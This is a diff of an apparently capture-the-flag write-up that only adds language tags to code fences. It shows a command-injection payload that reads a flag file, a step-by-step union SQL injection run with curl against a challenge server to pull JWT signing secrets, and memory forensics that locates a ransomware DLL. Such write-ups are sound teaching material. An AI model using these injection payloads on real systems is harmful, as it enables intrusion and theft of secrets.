@@ -37,7 +37,7 @@ def format_date(timestr):
 - that is an obvious command injection
 - i search other files and i don't see any sanitization so i can input something like this
 
-```
+```bash
 $(find / -name flag.txt 2>/dev/null)
 ```
 
@@ -45,7 +45,7 @@ $(find / -name flag.txt 2>/dev/null)
 
 - all is left is to read the flag
 
-```
+```bash
 $(cat /app/flag.txt)
 ```
 
@@ -60,7 +60,7 @@ $(cat /app/flag.txt)
 - this was a much more fun challenge, it involved an interesting exploit chain
 - it starts with understanding the database structure:
 
-```
+```bash
 DEVKEY=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 15 | head -n 1)
 PRODKEY=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 15 | head -n 1)
 
@@ -81,7 +81,7 @@ INSERT INTO tannen_memorial.keystore VALUES (2,'${PRODKEY}');
 - from there it inserts completely random values into the keystore secrets
 - the next thing we need to understand is the jwt implementation, that exists in the `JSTHelpers.js` file:
 
-```
+```js
 sign(data, kid='2') {
 		return new Promise(async (resolve, reject) => {
 			try {
@@ -101,7 +101,7 @@ sign(data, kid='2') {
 - so in my head at this point, i'm thinking if there is any way i can read the database i can possibly get the secret and exploit the jwt token
 - which takes us to `database.js`:
 
-```
+```js
    async getPost(id) {
         return new Promise(async (resolve, reject) => {
             let stmt = `SELECT * FROM posts WHERE id='${id}'`;
@@ -118,7 +118,7 @@ sign(data, kid='2') {
 
 - start by curling the `/posts/1` endpoint
 
-```
+```bash
 $ curl http://161.35.173.232:31576/posts/1 -s | grep card 
               <div class="card ancient-card card-grid" style="max-width: 30rem; min-width: 20rem">
                 <div class="card-body pt-0">
@@ -129,7 +129,7 @@ $ curl http://161.35.173.232:31576/posts/1 -s | grep card
 
 - i next try to union select 1 column:
 
-```
+```bash
 $ curl http://161.35.173.232:31576/posts/\'union%20select%201--%20- -s | grep card 
               <div class="card ancient-card card-grid" style="max-width: 30rem; min-width: 20rem">
                 <div class="card-body pt-0">
@@ -139,7 +139,7 @@ $ curl http://161.35.173.232:31576/posts/\'union%20select%201--%20- -s | grep ca
 
 - that results in an error, so i'll start adding #'s until i get different feedback
 
-```
+```bash
 $ curl http://161.35.173.232:31576/posts/\'union%20select%201,2,3,4--%20- -s | grep card  
               <div class="card ancient-card card-grid" style="max-width: 30rem; min-width: 20rem">
                 <div class="card-body pt-0">
@@ -151,7 +151,7 @@ $ curl http://161.35.173.232:31576/posts/\'union%20select%201,2,3,4--%20- -s | g
 - this returns the values 2 and 4 as seen in the h4 and p tags
 - i can now try to read a secret from the keystore values
 
-```
+```bash
 $ curl http://161.35.173.232:31576/posts/\'union%20select%201,secret,3,4%20from%20keystore--%20- -s | grep card 
               <div class="card ancient-card card-grid" style="max-width: 30rem; min-width: 20rem">
                 <div class="card-body pt-0">
@@ -185,7 +185,7 @@ $ curl http://161.35.173.232:31576/posts/\'union%20select%201,secret,3,4%20from%
 
 - at this point i wanted to look through files and i was already aware that `marty` is the user:
 
-```
+```C
 HTB vol.py -f memory.raw --profile=Win7SP1x86_23418 filescan | grep Downloads
 Volatility Foundation Volatility Framework 2.6.1
 0x000000003e298038      2      0 R--rwd \Device\HarddiskVolume1\Users\Marty\Downloads\Rans.exe
@@ -197,7 +197,7 @@ Volatility Foundation Volatility Framework 2.6.1
 - bingo! i see that there's a `Rans.exe` file that likely stands for ransomware
 - i dump it and try to reverse it but its very complicated with a ton going on, i highly doubt this is the route so i take a step back and look for other files that start with `Rans`
 
-```
+```C
 HTB vol.py -f memory.raw --profile=Win7SP1x86_23418 filescan | grep Rans
 Volatility Foundation Volatility Framework 2.6.1
 0x000000003f4b7038      6      0 R--r-d \Device\HarddiskVolume1\Users\Marty\AppData\Local\Temp\.net\Rans\LnxLq3C8fV66obdZMxa9l3pHdLe0wqc=\Rans.dll
@@ -206,7 +206,7 @@ Volatility Foundation Volatility Framework 2.6.1
 - bam! `Rans.dll`, i download it and throw it in dnspy and i get the following code:
 
 #### original code found in dnspy
-```
+```C#
 using System;
 using System.Collections.Generic;
 using System.IO;
@@ -312,7 +312,7 @@ namespace Rans
 - this looks like the encryptor, its reading files in the documents dir and encrypting them, all it'll take is slight reverse engineering and we can get the c# program to decrypt it:
 
 #### edited file to decrypt the data
-```
+```C#
 using System;
 using System.Collections.Generic;
 using System.IO;
